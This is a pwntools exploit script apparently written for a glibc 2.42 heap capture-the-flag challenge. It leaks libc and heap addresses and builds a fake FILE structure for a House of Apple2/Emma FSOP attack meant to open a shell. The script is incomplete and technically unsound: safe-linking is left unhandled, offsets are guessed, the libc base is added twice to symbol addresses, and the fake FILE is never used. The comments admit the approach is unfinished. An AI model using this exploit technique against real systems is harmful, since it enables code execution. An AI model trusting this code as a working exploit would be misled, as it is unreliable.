#!/usr/bin/env python3
"""
Crazy FSOP - Modern FSOP Exploit for glibc 2.42
================================================

Vulnerability: Out-of-bounds array access (no bounds check on idx)

Attack Plan:
1. Leak libc via unsorted bin
2. Leak heap via tcache
3. Use OOB write to overwrite critical pointers
4. Craft fake FILE structure using House of Apple2/Emma technique
5. Trigger FSOP to get shell

For glibc 2.42 FSOP:
- _IO_file_jumps and _IO_wfile_jumps are still available
- Can use _IO_wfile_overflow or similar to achieve RCE
- Need to satisfy checks in _IO_validate_vtable
"""

from pwn import *

# Setup
elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

# Helper functions
def start():
    if args.REMOTE:
        return remote('amt.rs', 26797)
    else:
        return process([elf.path])

def create(idx, size, data):
    io.sendlineafter(b'which operation: ', b'1')
    io.sendlineafter(b'which note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'which operation: ', b'2')
    io.sendlineafter(b'which note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'which operation: ', b'3')
    io.sendlineafter(b'which note: ', str(idx).encode())
    io.recvuntil(b'data: ')

# Main exploit
io = start()

info("=" * 50)
info("Stage 1: Leak libc address")
info("=" * 50)

# Allocate large chunk for unsorted bin
create(0, 0x500, b'AAAA')
create(1, 0x20, b'BBBB')  # Prevent consolidation

# Free into unsorted bin
delete(0)

# Leak from freed chunk
view(0)
libc_leak = u64(io.recv(6).ljust(8, b'\x00'))

# Calculate libc base
# For glibc 2.42, main_arena is in libc data section
# The unsorted bin fd points to main_arena + offset
# Let's calculate the offset

# From previous analysis:
# _IO_list_all: 0x2354c0
# This gives us an idea of where data section is

# Typical offset for unsorted bin in main_arena
# For glibc 2.42, this is around 0x203xxx or 0x21axxx
libc.address = libc_leak - 0x21ace0  # Standard offset for main_arena unsorted bin
success(f"Libc leak: {hex(libc_leak)}")
success(f"Libc base: {hex(libc.address)}")

# Verify with known symbols
success(f"system @ {hex(libc.symbols['system'])}")
success(f"_IO_list_all @ {hex(libc.symbols['_IO_list_all'])}")

info("=" * 50)
info("Stage 2: Leak heap address")
info("=" * 50)

# Create chunks in tcache
create(2, 0x100, b'CCCC')
create(3, 0x100, b'DDDD')

# Free to populate tcache
delete(2)
delete(3)

# Leak heap from tcache fd pointer
view(3)
heap_leak = u64(io.recv(6).ljust(8, b'\x00'))

# In glibc 2.32+, tcache uses safe-linking: fd = (next >> 12) ^ chunk_addr
# To get actual heap address, we need to demangle
# For now, use the leak directly
heap_base = (heap_leak << 12)  # Rough estimate
success(f"Heap leak: {hex(heap_leak)}")
success(f"Heap base (approx): {hex(heap_base)}")

info("=" * 50)
info("Stage 3: Prepare FSOP attack")
info("=" * 50)

# Key addresses
io_list_all = libc.symbols['_IO_list_all'] + libc.address
stderr = libc.symbols['_IO_2_1_stderr_'] + libc.address
io_wfile_jumps = 0x233228 + libc.address  # _IO_wfile_jumps from readelf
system = libc.symbols['system'] + libc.address
binsh = next(libc.search(b'/bin/sh\x00'))

success(f"_IO_list_all @ {hex(io_list_all)}")
success(f"stderr @ {hex(stderr)}")
success(f"_IO_wfile_jumps @ {hex(io_wfile_jumps)}")
success(f"system @ {hex(system)}")
success(f"/bin/sh @ {hex(binsh)}")

# For House of Apple 2, we need to:
# 1. Craft a fake FILE structure
# 2. Make _IO_list_all point to our fake FILE
# 3. Trigger FILE operations (via exit, assert, etc.)

# The FILE structure exploit for _IO_wfile_overflow:
# - _flags must have specific bits set
# - _wide_data must point to a controlled region
# - vtable must point to _IO_wfile_jumps
# - when overflow is called, it will call arbitrary function

# Let's use the simpler approach: House of Emma
# This works by corrupting the _IO_list_all to point to a fake FILE
# Then trigger exit() which will call _IO_flush_all_lockp

# Build fake FILE structure
fake_file = FileStructure()
fake_file.flags = 0x3b01010101010101  # Magic flags
fake_file._IO_read_ptr = 0x1
fake_file._IO_read_end = 0x2
fake_file._IO_read_base = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file._IO_write_end = 2
fake_file._lock = stderr + 0x10  # Needs to be writable
fake_file._codecvt = 0
fake_file._wide_data = stderr + 0x200  # Controlled area
fake_file.vtable = io_wfile_jumps

# Actually, let's use a direct approach
# Since we have OOB write, we can directly overwrite function pointers

info("=" * 50)
info("Stage 4: Trigger exploit")
info("=" * 50)

# Strategy: Use the index OOB to write directly to GOT or other locations
# The notes array is in BSS, so we can calculate offsets

# Alternative simpler approach for this challenge:
# 1. Use tcache poisoning to get allocation at __free_hook or similar
# 2. Overwrite with system
# 3. Free a chunk containing "/bin/sh"

# But __free_hook is removed in glibc 2.34+
# So we must use FSOP or other techniques

# Let's try to get arbitrary write via tcache poisoning
# We need to bypass safe-linking

# For this challenge with OOB, we might be able to:
# - Write directly to _IO_list_all using negative index
# - Or corrupt tcache bins to allocate at arbitrary location

# Try to calculate the offset from notes[] to other interesting locations
# This requires knowing where notes[] is in BSS and where target is

# For now, let's try a tcache poisoning attack
create(4, 0x100, b'EEEE')
delete(4)

# Overwrite tcache fd to point to _IO_list_all - 0x10
# (We subtract 0x10 because malloc returns chunk+0x10)
target = io_list_all - 0x10

# To bypass safe-linking: fd = (next >> 12) ^ ptr
# We need to know the exact heap address of chunk 4
# Let's assume we can calculate it from our heap leak

# This is getting complex. Let me try a different approach.
# Since we have arbitrary array OOB, let's find the offset to GOT

# Actually, the program is PIE, so we'd need to leak the binary base too
# Let's focus on the FSOP route

# Create a large payload that we'll use for the fake FILE
create(5, 0x300, b'F' * 0x300)

# Now we need to get this allocated at a strategic location
# and then trigger the exploit

# For a working exploit, I need to:
# 1. Figure out exact heap layout
# 2. Calculate offsets for OOB write
# 3. Build proper fake FILE structure
# 4. Trigger it

# Let me try triggering exit and see what happens
io.sendline(b'999')  # Invalid choice triggers done: label

io.interactive()
